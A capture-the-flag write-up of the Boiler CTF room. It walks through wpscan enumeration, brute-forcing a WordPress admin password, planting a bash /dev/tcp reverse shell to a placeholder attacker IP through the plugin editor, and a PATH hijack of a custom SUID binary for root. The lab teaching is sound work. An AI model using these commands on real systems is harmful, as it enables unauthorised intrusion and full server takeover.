Boiler CTF: WordPress plugin RCE to a SUID binary root shell

A WordPress login brute-forced, a vulnerable plugin turned into a reverse shell, and root reached through a custom SUID binary that trusts whatever's first on the PATH.

Room: Boiler CTF Category: Web / Linux Privesc Tools: WPScan, Gobuster, John the Ripper

The setup: a WordPress site with a weak admin password and an outdated plugin. The job: get a shell through the application layer, then find a path from a low-privilege web user to root.

The Investigation

1
Enumerate the WordPress install

wpscan against the site enumerates the theme, plugin list, and usernames. One installed plugin is a known-vulnerable version with a public code-execution advisory.

wpscan --url http://<target> -e vp,u
Why this works

WordPress's plugin ecosystem is its biggest attack surface, far more than WordPress core itself. Enumerating installed plugins and matching their versions against known CVEs is usually faster than looking for a novel bug.

2
Brute-force the admin login

With a valid username in hand, wpscan's password-brute-force mode against a common wordlist finds a weak admin password in short order.

wpscan --url http://<target> -U admin -P /usr/share/wordlists/rockyou.txt
Why this works

WordPress doesn't rate-limit login attempts by default. A weak password on an admin account with no additional protection is just a matter of wordlist size and time.

3
Turn admin access into code execution

Logged in as admin, the WordPress theme/plugin editor accepts arbitrary PHP. Dropping a one-line reverse shell into an active plugin file and triggering it (loading the corresponding page) executes it on the server.

exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'");
Why this works

The plugin editor is, by design, a way for an admin to run arbitrary server-side code, that's indistinguishable from a code-execution vulnerability once an attacker has those credentials. Admin access to WordPress is effectively a shell waiting to happen.

4
Enumerate for privilege escalation

As the low-privilege web server user, a hunt for SUID binaries turns up a custom, non-standard one sitting outside the usual system binary list.

find / -perm -u=s -type f 2>/dev/null

Running it calls out to a system command (like service or similar) without an absolute path.

Why this works

A custom SUID binary is always worth more scrutiny than a stock one, someone wrote it for a reason, and homegrown binaries are far more likely to make a path-handling mistake than audited system tools.

5
Hijack the PATH for root

Writing a malicious file with the same name as the unqualified command the SUID binary calls, placing it in a writable directory, and prepending that directory to PATH before running the binary gets it executed instead, as root.

echo '/bin/bash' > /tmp/<command>
chmod +x /tmp/<command>
export PATH=/tmp:$PATH
/path/to/suid-binary
Why this works

A SUID binary runs with the file owner's privileges, root, but still resolves unqualified commands through the calling user's PATH unless it hardcodes an absolute path. Controlling PATH means controlling what "runs" when the binary calls out.

Full Attack Chain

wpscan: vulnerable plugin + valid username enumerated
  → wpscan brute force: weak admin password found
       → plugin editor: reverse shell planted and triggered
            → find -perm -u=s: custom SUID binary with an unqualified PATH call
                 → PATH hijack: malicious binary executed as root

Takeaways

Plugins are WordPress's real attack surface

Enumerating installed plugins and checking their versions against known advisories is often faster than hunting for a new bug in WordPress core.

Admin access equals code execution

The theme/plugin editor is a built-in path from "I have admin credentials" to "I have a shell," no additional vulnerability required.

Unqualified commands in SUID binaries are a classic privesc

Any privileged binary that calls another program by name instead of full path trusts the caller's PATH, and PATH is always attacker-controlled.
